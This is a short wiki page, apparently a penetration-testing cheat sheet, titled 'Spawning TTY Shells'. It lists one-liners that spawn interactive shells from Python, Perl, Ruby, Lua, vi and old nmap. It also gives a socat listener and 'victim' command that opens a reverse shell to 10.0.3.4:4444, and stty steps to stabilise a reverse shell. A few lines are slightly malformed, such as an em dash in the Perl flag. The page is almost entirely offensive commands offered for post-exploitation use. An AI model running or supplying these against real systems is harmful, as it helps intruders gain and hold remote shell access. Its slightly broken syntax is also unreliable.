---
title: "Spawning TTY Shells"
slug: "spawning-tty-shells"
priority: 5
editor: "wysiwyg"
revisionCount: 1
id: 74
createdAt: "2022-09-23T23:35:33Z"
createdBy: "mxrch"
updatedAt: "2022-09-23T23:35:33Z"
updatedBy: "mxrch"
ownedBy: "mxrch"
views: 3
---
<h3 id="bkmrk-shell-spawning">Shell Spawning</h3>
<h4 id="bkmrk-python">Python</h4>
<pre id="bkmrk-python--c-%27import-pt"><code class="language-">python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'</code></pre>
<h4 id="bkmrk-bash"><strong>Bash</strong></h4>
<pre id="bkmrk-echo-os.system%28%27%2Fbin"><code class="language-">echo os.system('/bin/bash')
/bin/sh -i</code></pre>
<h4 id="bkmrk-perl"><strong>Perl</strong></h4>
<pre id="bkmrk-perl-%E2%80%94e-%27exec-%22%2Fbin%2F"><code class="language-">perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";</code></pre>
<h4 id="bkmrk-ruby"><strong>Ruby</strong></h4>
<pre id="bkmrk-ruby%3A-exec-%22%2Fbin%2Fsh%22"><code class="language-">ruby: exec "/bin/sh"</code></pre>
<h4 id="bkmrk-lua"><strong>LUA</strong></h4>
<pre id="bkmrk-lua%3A-os.execute%28%27%2Fbi"><code class="language-">lua: os.execute('/bin/sh')</code></pre>
<h4 id="bkmrk-from-within-irb"><strong>From Within IRB</strong></h4>
<pre id="bkmrk-exec-%22%2Fbin%2Fsh%22"><code class="language-">exec "/bin/sh"</code></pre>
<h4 id="bkmrk-inside-vi"><strong>Inside vi</strong></h4>
<pre id="bkmrk-%3A%21bash-%3Aset-shell%3D%2Fb"><code class="language-">:!bash
:set shell=/bin/bash:shell</code></pre>
<h4 id="bkmrk-nmap-%3C%3D5.21"><strong>Nmap &lt;=5.21</strong></h4>
<pre id="bkmrk-nmap--v-nmap---inter"><code class="language-">nmap -V
nmap --interactive
!sh</code></pre>
<h4 id="bkmrk-socat"><strong>Socat </strong></h4>
<p id="bkmrk-%23-listener"><strong># Listener</strong></p>
<pre id="bkmrk-socat-file%3A%60tty%60%2Craw"><code class="language-">socat file:`tty`,raw,echo=0 tcp-listen:4444</code></pre>
<p id="bkmrk-%23-victim"># Victim</p>
<pre id="bkmrk-socat-exec%3A%27bash--li"><code class="language-">socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</code></pre>
<h4 id="bkmrk-%C2%A0"> </h4>
<h3 id="bkmrk-stty-options"><strong>STTY Options </strong></h3>
<h4 id="bkmrk-in-reverse-shell"><strong>In Reverse Shell</strong></h4>
<pre id="bkmrk-%24-python--c-%27import-"><code class="language-">$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z</code></pre>
<h4 id="bkmrk-in-kali"><strong>In Kali </strong></h4>
<pre id="bkmrk-%24-stty-raw--echo-%24-f"><code class="language-">$ stty raw -echo
$ fg
press enter</code></pre>
<h4 id="bkmrk-in-reverse-shell-0"><strong>In Reverse Shell</strong></h4>
<pre id="bkmrk-%24-reset-%24-export-she"><code class="language-">$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows &lt;num&gt; columns &lt;cols&gt;</code></pre>
<pre id="bkmrk-sh--r-rsh-rbash-bash"><code class="language-">sh -r 
rsh

rbash
bash -r
bash --restricted

rksh
ksh -r</code></pre>
<p id="bkmrk-%C2%A0-0"> </p>
<p id="bkmrk-%C2%A0-1"> </p>
<p id="bkmrk-%C2%A0-2"> </p>
